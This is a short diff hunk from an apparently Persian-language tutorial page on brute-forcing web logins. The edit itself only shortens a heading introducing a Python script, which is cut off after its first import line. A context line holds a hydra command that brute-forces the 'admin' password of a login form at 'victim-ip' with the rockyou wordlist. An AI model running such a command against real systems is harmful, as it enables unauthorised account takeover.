@@ -101,7 +101,7 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt victim-ip http-post-form "/lo
 </p>
 
 
-<p dir="rtl" align="justify">2. با یک اسکریپت پایتون ساده (اگر می‌خواهید خودتان بنویسید)</p>
+<p dir="rtl" align="justify">2. اسکریپت پایتون ساده</p>
 
 ```python
 import requests
